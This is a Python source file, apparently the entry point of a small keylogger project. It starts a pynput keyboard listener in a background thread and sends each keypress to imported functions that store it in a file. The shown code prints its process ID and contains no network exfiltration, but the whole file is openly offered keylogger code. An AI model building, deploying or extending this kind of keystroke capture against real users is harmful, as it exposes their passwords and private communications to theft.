#RUN.PY
'''
RUNS ALL MODULES OF THE KEYLOGGER
MAIN FILE
'''

import threading 
from script import keyPressedF, buffer_words
from functools import partial
from pynput import keyboard
import os
stop_event = threading.Event()
buffer_local= []
from cfile import checkfile

def keyboard_logger_pathed_without_timer(path):
    print(f"Keylogger running with PID: {os.getpid()}")
    keyPressed_with_path = partial(keyPressedF, file_path=path)

    listener = keyboard.Listener(on_press=keyPressed_with_path)
    listener.start()

    try:
        while True:  # Infinite loop to keep the thread running
            threading.Event().wait(0.1)
    except KeyboardInterrupt:
        listener.stop()

def run():
    store_file = checkfile()
    if isinstance(store_file, Exception):
        return

    #client

    t1 = threading.Thread(target=keyboard_logger_pathed_without_timer, name='logger', args=(store_file,))
    t1.daemon = True  # Allows the program to exit if the main thread exits
    t1.start()

    # Keep the main thread alive indefinitely
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("Program terminated.")

if __name__ == "__main__":
    run()
